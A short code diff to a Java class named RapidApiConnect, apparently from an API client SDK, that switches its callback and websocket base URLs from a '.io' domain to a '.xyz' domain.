@@ -63,9 +63,9 @@ public class RapidApiConnect {
     return RapidApiConnect.getBaseUrl() + "/" + pack + "/" + block;
   }
 
-    private static String callbackBaseUrl() { return "https://webhooks.rapidapi.io"; }
+    private static String callbackBaseUrl() { return "https://webhooks.rapidapi.xyz"; }
 
-    private static String websocketBaseUrl() { return "wss://webhooks.rapidapi.io"; }
+    private static String websocketBaseUrl() { return "wss://webhooks.rapidapi.xyz"; }
 
   /**
   * Call a block
